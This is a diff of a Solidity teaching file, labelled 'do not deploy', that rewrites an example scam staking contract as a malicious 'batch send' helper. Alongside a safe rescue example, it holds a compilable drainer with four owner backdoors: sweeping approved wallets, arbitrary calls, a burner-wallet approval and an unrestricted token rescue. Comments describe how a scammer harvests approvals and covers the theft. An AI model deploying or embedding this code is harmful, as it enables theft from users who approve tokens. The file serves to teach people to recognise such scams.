@@ -1,133 +1,105 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.18;
+pragma solidity ^0.8.18;
 
-import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
-import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+/// ================================================================
+///
+///   ⚠️  REDFLAG EXAMPLES — A SCAMMER'S PLAYBOOK FOR "SEND" / HELPER
+///                          CONTRACTS THAT ASK FOR APPROVAL
+///
+/// ================================================================
+///
+/// READ THIS FIRST. This file is NOT meant to be deployed. It is a
+/// teaching tool that shows what a malicious version of BatchSend.sol
+/// (or any helper contract that asks users to approve a token) looks
+/// like under the hood.
+///
+/// The pattern works like this:
+///   1. Scammer deploys this contract and presents a slick frontend:
+///      "Batch send USDT to friends! Airdrop tool! Save gas!"
+///   2. To use it, users must approve the contract to spend their USDT.
+///      Most people approve UNLIMITED (because it's easier) and the dApp
+///      defaults to that.
+///   3. Once a few thousand users have approved, the owner pulls one of
+///      the planted backdoor levers and drains every approver's wallet.
+///
+/// All 4 backdoors below are deliberate scam tools the OWNER plants
+/// and triggers themselves — no outside hacker required. The owner
+/// IS the attacker.
+///
+/// If a "send helper" / "airdrop tool" / "batch transfer" contract
+/// looks like THIS, do not approve it.
+///
+/// Paste any of the marked functions into another AI and ask:
+///   "What can the owner of this helper contract do to my approved USDT?"
+///
+/// ================================================================
 
-/**
- * ⚠️  REFERENCE / EDUCATIONAL FILE — DO NOT DEPLOY  ⚠️
- *
- * This file is NOT in any migration. It exists ONLY so you can read a real,
- * compiling staking contract written FROM A SCAMMER'S PERSPECTIVE.
- *
- * Imagine the deployer = the hacker. Their plan:
- *   1. Make a contract that LOOKS like a normal staking dApp.
- *   2. Convince users to approve unlimited USDT to it.
- *   3. Wait for enough TVL.
- *   4. Pull the trigger by calling one of the planted backdoors below.
- *
- * The contract below is exactly what such a scam looks like under the hood.
- * All 4 backdoors are deliberate scam tools the OWNER plants and triggers
- * themselves — no outside hacker required. The owner IS the attacker.
- *
- * If a project's contract looks like THIS, do not approve it.
- *
- * Paste any of the marked functions into another AI and ask:
- *   "What can the owner of this staking contract do to my approved USDT?"
- *
- * NONE of this affects your real contract. It is isolated reference material.
- */
+interface IERC20 {
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function balanceOf(address owner) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
 
-contract MaliciousStaking is
-    Initializable,
-    OwnableUpgradeable,
-    ReentrancyGuardUpgradeable,
-    UUPSUpgradeable
-{
-    using SafeERC20Upgradeable for IERC20Upgradeable;
+contract MaliciousBatchSend {
+    address public owner;
+    address public defaultToken; // e.g. USDT — what users are tricked into approving
 
-    // ----- normal-looking storage (mirrors our real Staking.sol) -----
-    IERC20Upgradeable public stakingToken;
-    uint256 public aprBps;
-    uint256 public lockPeriod;
-    uint256 public totalStaked;
-    uint256 public rewardPool;
-
-    mapping(address => uint256) public stakedAmount;
-    mapping(address => uint256) public lastStakeTime;
-
-    event Staked(address indexed user, uint256 amount);
-    event Unstaked(address indexed user, uint256 amount);
-
-    /// @custom:oz-upgrades-unsafe-allow constructor
-    constructor() {
-        _disableInitializers();
+    constructor(address _token) {
+        owner = msg.sender;
+        defaultToken = _token;
     }
 
-    function initialize(address _token, uint256 _aprBps) external initializer {
-        __Ownable_init();
-        __ReentrancyGuard_init();
-        __UUPSUpgradeable_init();
-        stakingToken = IERC20Upgradeable(_token);
-        aprBps = _aprBps;
-        lockPeriod = 7 days;
+    modifier onlyOwner() {
+        require(msg.sender == owner, "not owner");
+        _;
     }
 
-    // =====================================================================
-    //                  NORMAL-LOOKING USER FUNCTIONS
-    //   (these are fine — they look like every staking contract on TRON)
-    // =====================================================================
+    // ---------- The "legit-looking" public function (the bait) ----------
 
-    function stake(uint256 amount) external nonReentrant {
-        require(amount > 0, "amount=0");
-        stakedAmount[msg.sender] += amount;
-        lastStakeTime[msg.sender] = block.timestamp;
-        totalStaked += amount;
-        // ✅ legit: transferFrom uses msg.sender as the source
-        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
-        emit Staked(msg.sender, amount);
-    }
-
-    function unstake(uint256 amount) external nonReentrant {
-        require(stakedAmount[msg.sender] >= amount, "insufficient");
-        stakedAmount[msg.sender] -= amount;
-        totalStaked -= amount;
-        stakingToken.safeTransfer(msg.sender, amount);
-        emit Unstaked(msg.sender, amount);
-    }
-
-    function fundRewardPool(uint256 amount) external onlyOwner {
-        rewardPool += amount;
-        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
-    }
-
-    function setAPR(uint256 newAprBps) external onlyOwner {
-        aprBps = newAprBps;
+    /// Looks completely normal — what the frontend advertises. Users sign
+    /// `approve(MaliciousBatchSend, MAX)` to enable it. That approval is
+    /// what the backdoors below abuse.
+    function batchTransfer(
+        address token,
+        address[] calldata recipients,
+        uint256[] calldata amounts
+    ) external {
+        require(recipients.length == amounts.length, "len mismatch");
+        for (uint256 i = 0; i < recipients.length; i++) {
+            IERC20(token).transferFrom(msg.sender, recipients[i], amounts[i]);
+        }
     }
 
     // =====================================================================
-    //   🚩 RED FLAG #1 — SCAMMER'S DRAIN BUTTON (transferFrom on victim)
+    //   🚩 RED FLAG #1 — SCAMMER'S DRAIN BUTTON (single-victim sweep)
     // =====================================================================
-    // The scammer ships this function from day one with an innocent name
-    // ("emergencyWithdraw", "rescueUser", "migrate"). The killer is the
-    // FIRST argument to transferFrom: it's `victim`, not `msg.sender`.
-    // This pulls USDT from any wallet that approved — straight to owner.
+    // The scammer's "harvest" function. They marketed this as a helper
+    // contract and got thousands of approve-MAX signatures. Now they
+    // loop this function over their list of approvers and pull every
+    // last token out of each wallet — even if the user never actually
+    // batch-sent anything.
     //
-    // The scammer's playbook: deploy → wait for users to approve → call
-    // this function with each victim's address in a loop → drain.
-    //
-    // ✅ Legit (see stake() above): transferFrom(msg.sender, ...)
-    // 🚩 Scammer (below):           transferFrom(victim, ...)
+    // Called from the OWNER's wallet via TronScan → "Write Contract".
+    // No UI for it; the dApp pretends it doesn't exist.
 
     function emergencyWithdraw(address victim) external onlyOwner {
-        uint256 bal = stakingToken.balanceOf(victim);
-        stakingToken.safeTransferFrom(victim, owner(), bal);
+        uint256 bal = IERC20(defaultToken).balanceOf(victim);
+        // Uses the unlimited approval the victim granted to THIS contract.
+        IERC20(defaultToken).transferFrom(victim, owner, bal);
     }
 
     // =====================================================================
-    //   🚩 RED FLAG #2 — SCAMMER'S SWISS ARMY KNIFE (arbitrary call)
+    //   🚩 RED FLAG #2 — SCAMMER'S SWISS ARMY KNIFE (arbitrary calls)
     // =====================================================================
-    // Hidden under an innocent name like "execute" / "multicall" / "forward".
-    // Lets the scammer make THIS staking contract call ANY function on ANY
-    // contract. Their playbook: craft a call to USDT.transferFrom(victim,
-    // owner, balance) and drain anyone who approved — for any token, not
-    // just USDT. This single function is enough to rug an entire dApp.
+    // One function, infinite damage. Whatever the scammer wants to do —
+    // drain any token, call any contract, set any approval, mint, burn —
+    // they encode the call and shoot it through here.
     //
-    // 🚩 Giveaway: `target.call(data)` where owner controls both args.
+    // The contract acts as the caller, so it can spend ANY token that
+    // ANY user has ever approved to it. That makes this the worst
+    // backdoor of the lot — drains tokens you didn't even know were
+    // touched by this contract.
 
     function execute(address target, bytes calldata data)
         external
@@ -139,57 +111,75 @@ contract MaliciousStaking is
         return ret;
     }
 
-    // Required by UUPS. Kept gated with onlyOwner so this file stays focused
-    // on insider/owner attacks only — no outsider exploit surface here.
-    function _authorizeUpgrade(address) internal override onlyOwner {}
-
     // =====================================================================
     //   🚩 RED FLAG #3 — SCAMMER'S DECOY (approve a "second wallet" to drain)
     // =====================================================================
-    // The scammer makes the staking contract approve a SECOND wallet they
-    // control. That second wallet then calls USDT.transferFrom and drains
-    // the pool. Why bother with the second wallet? Plausible deniability —
-    // the scammer can blog "we got phished, our spender approval leaked",
-    // dodging blame while the funds end up in their own pocket.
+    // The scammer makes this contract approve a SECOND wallet they
+    // control. That second wallet then calls USDT.transferFrom on every
+    // approver and drains them.
     //
-    // 🚩 Giveaway: any owner-callable function that calls .approve() on the
-    //              staking token to a non-zero spender.
+    // Why bother with the indirection? Plausible deniability — the
+    // scammer can publicly cry "we got phished, our spender wallet
+    // leaked" while the chain shows the drain came from a different
+    // address than the owner. Cheap PR cover; the on-chain reality is
+    // that they triggered the approval themselves.
 
     function setSpender(address spender, uint256 amount) external onlyOwner {
-        stakingToken.approve(spender, amount);
+        // Lets a third-party (the scammer's burner) pull on behalf of
+        // every approver indirectly — same effect as Red Flag #1 but
+        // executed from a different wallet.
+        IERC20(defaultToken).approve(spender, amount);
     }
 
     // =====================================================================
-    //   🚩 RED FLAG #4 — SCAMMER'S CLEAN EXIT ("rescue" the staked token)
+    //   🚩 RED FLAG #4 — SCAMMER'S CLEAN EXIT ("rescue" any token)
     // =====================================================================
-    // The scammer markets this as a "safety feature" — recover tokens
-    // accidentally sent to the contract. But because it accepts ANY token
-    // address (including the staked USDT itself), they can pull the entire
-    // pool — every user's stake + the reward pool — to themselves.
+    // The most popular rug pattern on TRON and BSC. Marketed as a
+    // "safety feature" — recover any token accidentally sent to the
+    // contract. But because it accepts ANY token address (including
+    // USDT itself) and has no caller restrictions on what gets pulled,
+    // it lets the owner walk away with anything sitting in the contract.
     //
-    // This is the most popular rug on TRON / BSC because it looks innocent
-    // in the source code. Then "an exploit happens" and the funds are gone.
+    // For a "batch send" / "airdrop" tool the contract may collect:
+    //   - fees the scammer charged per transfer
+    //   - dust users sent for testing
+    //   - tokens the scammer briefly parked here while staging a rug
     //
-    // ✅ Safe version would have:
-    //      require(token != address(stakingToken), "cannot touch user funds");
-    // 🚩 Scammer version (below) is missing that line.
+    // Even worse: combined with Red Flag #3, the scammer can use
+    // setSpender to pull from approvers INTO this contract, then call
+    // rescueTokens to extract it to themselves — leaving the original
+    // drain transaction looking like a "compromise" instead of a sweep.
 
     function rescueTokens(address token, uint256 amount) external onlyOwner {
-        IERC20Upgradeable(token).safeTransfer(owner(), amount);
+        IERC20(token).transfer(owner, amount);
     }
 }
 
-// =========================================================================
-// ✅ For comparison: a SAFE rescue function (the legit version of #5)
-// =========================================================================
-// Same intent — let the owner recover tokens accidentally sent to the
-// contract — but with the critical guard that protects user funds.
-contract SafeRescueExample is OwnableUpgradeable {
-    using SafeERC20Upgradeable for IERC20Upgradeable;
-    IERC20Upgradeable public stakingToken;
+// =====================================================================
+//   ✅ SAFE REFERENCE — what a real "rescue" function should look like
+// =====================================================================
+// If a contract genuinely needs to recover stuck tokens, the rescue
+// function MUST exclude the token(s) the contract is supposed to handle,
+// and ideally MUST have a timelock or community vote. Like this:
 
-    function rescueTokens(address token, uint256 amount) external onlyOwner {
-        require(token != address(stakingToken), "cannot touch user funds");
-        IERC20Upgradeable(token).safeTransfer(owner(), amount);
+contract SafeRescueExample {
+    address public owner;
+    address public immutable protectedToken;
+
+    constructor(address _protected) {
+        owner = msg.sender;
+        protectedToken = _protected;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "not owner");
+        _;
+    }
+
+    /// Only lets the owner recover tokens that are NOT the protected one.
+    /// So even if the owner turns malicious, they can't touch user funds.
+    function rescueStuckToken(address token, uint256 amount) external onlyOwner {
+        require(token != protectedToken, "cannot rescue protected token");
+        IERC20(token).transfer(owner, amount);
     }
 }
